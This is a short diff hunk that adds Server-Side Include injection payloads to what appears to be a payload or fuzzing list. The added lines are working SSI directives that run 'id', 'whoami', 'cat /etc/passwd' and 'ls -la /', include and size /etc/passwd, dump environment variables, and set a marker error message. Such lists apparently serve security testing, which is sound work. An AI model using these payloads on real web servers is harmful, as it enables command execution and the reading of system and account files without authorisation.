@@ -73,3 +73,13 @@
 <!--#echo var="http_user_agent" -->
 <!--#echo var="http_ua_os" -->
 <!--#echo var="http_ua_cpu" -->
+<!--#exec cmd="id"-->
+<!--#exec cmd="whoami"-->
+<!--#include virtual="/etc/passwd"-->
+<!--#echo var="DATE_LOCAL"-->
+<!--#printenv -->
+<!--#exec cmd="cat /etc/passwd"-->
+<!--#exec cmd="ls -la /"-->
+<!--#include file="/etc/passwd"-->
+<!--#config errmsg="OMNI" -->
+<!--#fsize file="/etc/passwd" -->
